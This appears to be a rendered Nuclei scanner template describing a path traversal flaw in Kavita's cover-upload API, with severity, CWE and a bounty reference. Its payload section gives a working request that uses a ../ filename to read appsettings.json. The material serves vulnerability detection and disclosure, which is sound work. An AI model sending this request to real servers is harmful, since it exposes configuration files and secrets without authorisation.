# Nuclei Template: Kavita - Local File Inclusion
**Template ID:** kavita-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`kavita-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/image/cover-upload?filename=../appsettings.json
```

## References
- https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
